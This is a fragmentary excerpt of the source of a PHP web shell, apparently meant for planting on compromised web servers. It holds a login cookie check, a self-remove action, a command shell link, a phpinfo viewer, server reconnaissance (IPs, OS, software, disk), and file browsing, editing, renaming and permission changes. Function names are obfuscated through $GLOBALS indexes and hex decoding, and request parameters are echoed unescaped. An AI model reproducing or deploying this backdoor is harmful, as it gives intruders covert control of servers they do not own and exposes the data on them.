...
?>
	...
	<div class="phdiv border">
		...
		<span class="left">
			<br>
			<a class="shact" href="?0=<?php echo $_GET["0"];?>&2=open">[ back ]</a>
		</span>
	</div>

<script>
	let path = "<?php echo $_GET["0"];?>"
</script>

<?php echo ajaxTemplate ();?>
...
?>
	...
	<div class="phdiv">
		<iframe src="?0=<?php echo $_GET["0"];?>&2=ajx-phpinfo" class="phpinfo"></iframe>
		<span class="left">
			<br>
			<a class="shact" href="?0=<?php echo $_GET["0"];?>&2=open">[ back ]</a>
		</span>
...
<div class="shact">
	...
	<a onclick="confExec ('Logout?', 'document.cookie = \'webshelLoginVerify=; expires=Thu, 01-Jan-70 00:00:01 GMT\'; window.location = window.location')">[ logout ]</a>
	<a href="?0=<?php echo $_GET["0"];?>&2=shell">[ shell ]</a>
	<a href="?0=<?php echo $_GET["0"];?>&2=phpinfo">[ phpinfo ]</a>
	<a onclick="confExec ('Remove this webshell?', 'ajax (\'?2=ajx-slfrm\', \'exec\')')">[ self remove ]</a>
...
<script>
	...
	function fileDataUpdate () {
		...
		setTimeout (function () {
			...
			ajax ("?0=<?php echo $_GET["0"];?>&2=ajx-open", tableData)
			ajax ("?0=<?php echo $_GET["0"];?>&2=ajx-info", infoTable)
...
function slfrm () {
	...
	die ($GLOBALS[18] (__FILE__) ? "document.cookie = 'webshelLoginVerify=; expires=Thu, 01-Jan-70 00:00:01 GMT'; window.location = window.location" : "showNotification ('Failed')");
...
function fix_path () {
	...
	if (!$GLOBALS[10] ($_GET["0"])) {
		...
		while (!$GLOBALS[10] ($loop) && $loop != $GLOBALS[21]($loop)) $loop = $GLOBALS[21]($loop);
...
function fix_data () {
	...
	$reaf = ["ajx-download"];
	$reau = ["ajx-chmod"];
	$unvrs = ["phpinfo", "ajx-slfrm", "ajx-phpinfo", "ajx-info", "shell", "ajx-shell"];
	$all = $GLOBALS[29] (
		$read, $GLOBALS[29] (
			$act, $GLOBALS[29] (
				$unvrs, $GLOBALS[29] (
...
function getPURL () {
	...
	if ($GLOBALS[23] ($loop) == "") $x = [ $loop ];

	$y = [ $GLOBALS[27] ($loop) ];

	while ($GLOBALS[21]($loop) != $loop) {
...
?>
	...
	<tr>
		<td colspan='2' class='tdH'>
			<b>
				( your ip : <?php echo $_SERVER["REMOTE_ADDR"];?> | serv ip : <?php echo $serv_ip;?> )
			</b>
			<br>
			<br>
		</td>
	...
	<tr>
		<td class='tdH'>sys&nbsp; :&nbsp;</td>
		<td class='tdB'><?php echo $GLOBALS[5] ($GLOBALS[32] ());?></td>
	</tr>
	<tr>
		<td class='tdH'>soft :&nbsp;</td>
		<td class='tdB'><?php echo $GLOBALS[5] ($_SERVER["SERVER_SOFTWARE"]);?></td>
	</tr>
	<tr>
		<td class='tdH'>php &nbsp;:&nbsp;</td>
		<td class='tdB'><?php echo $GLOBALS[31] ();?></td>
	</tr>
	<tr>
		<td class='tdH'>disk&nbsp;:&nbsp;</td>
		<td class='tdB'><?php echo hdd ()["used"];?> / <?php echo hdd ()["all"];?> (<?php echo hdd ()["free"];?> free)</td>
	</tr>
	<tr>
		<td colspan="2"><br></td>
	</tr>
	<tr>
		<td colspan='2' class='tdH'><?php echo getPURL ();?></td>
	</tr>
...
function showFiles () {
	...
	($GLOBALS[20] ("\\", "/", $GLOBALS[21]($_GET["0"])) == $_GET["0"]) ? $dir = $GLOBALS[29] (["."], $GLOBALS[28] ($dir, ["..", "."])) : $dir = $GLOBALS[29] ([".", ".."], $GLOBALS[28] ($dir, ["..", "."]));
...
function rnmflodir () {
	...
	if (!isset ($_GET["02"])) ;
	elseif ($_GET["02"] == "") echo "New name cannot be empty";
...
function exchmd () {
	...
	if ($GLOBALS[9] ($_GET["02"], "1") != false) $flPerm |= 0400;
	if ($GLOBALS[9] ($_GET["02"], "2") != false) $flPerm |= 0040;
	if ($GLOBALS[9] ($_GET["02"], "3") != false) $flPerm |= 0004;

	if ($GLOBALS[9] ($_GET["02"], "4") != false) $flPerm |= 0200;
	if ($GLOBALS[9] ($_GET["02"], "5") != false) $flPerm |= 0020;
	if ($GLOBALS[9] ($_GET["02"], "6") != false) $flPerm |= 0002;

	if ($GLOBALS[9] ($_GET["02"], "7") != false) $flPerm |= 0100;
	if ($GLOBALS[9] ($_GET["02"], "8") != false) $flPerm |= 0010;
	if ($GLOBALS[9] ($_GET["02"], "9") != false) $flPerm |= 0001;
...
<div class="phpinfo">
	<table class="chTable">
		...
		<tr class="trFl">
			...
			<td class="center"><input type="checkbox" id="b1" <?php echo $a;?>></td>
			<td class="center"><input type="checkbox" id="b2" <?php echo $b;?>></td>
			<td class="center"><input type="checkbox" id="b3" <?php echo $c;?>></td>
		</tr>
		<tr class="trFl">
			<td class="right">Write</td>
			<td class="center"><input type="checkbox" id="b4" <?php echo $d;?>></td>
			<td class="center"><input type="checkbox" id="b5" <?php echo $e;?>></td>
			<td class="center"><input type="checkbox" id="b6" <?php echo $f;?>></td>
		</tr>
		<tr class="trFl">
			<td class="right">Execute</td>
			<td class="center"><input type="checkbox" id="b7" <?php echo $g;?>></td>
			<td class="center"><input type="checkbox" id="b8" <?php echo $h;?>></td>
			<td class="center"><input type="checkbox" id="b9" <?php echo $i;?>></td>
		</tr>
		<tr>
			<th colspan="4">
				<br>
				<a href="?0=<?php echo $_GET["0"];?>&2=open">[ cancel ]</a>
...
<script>
	function listCheckBox () {
		...
		ajax ("?0=<?php echo $_GET["0"] . "/" . $_GET["02"];?>&2=ajx-chmod&02=" + dataList, "notification")
...
<script>
	...
	function showNotification (data) {
		...
		notificationtext.innerHTML = data
...
<div class="phdiv">
	<textarea id="textAreaId" class="phpinfo left"><?php echo $textareaValue;?></textarea>
	<span class="left">
		<br>
		<a href="?0=<?php echo $_GET["0"];?>&2=open">[ back ]</a>
		<a onclick="ajax ('?0=<?php echo $_GET['0'];?>&2=ajx-file&02=<?php echo $_GET['02'];?>', 'notification', getElementById ('textAreaId').value)">[ save ]</a>
	</span>
</div>
...
function saveFlCh () {
	...
	echo ($GLOBALS[0] ($open, $_POST["post"]) || $data == $_POST["post"]) ? "Successfully" : "Failed";
...
function startEncodeFunction () {
	...
	for ($i = 0; $i < $count; $i++) {
		...
		for ($x = 0; $x < strlen ($encFunct[$i]) - 1; $x += 2) $n .= chr (hexdec ($encFunct[$i][$x] . $encFunct[$i][$x + 1]));
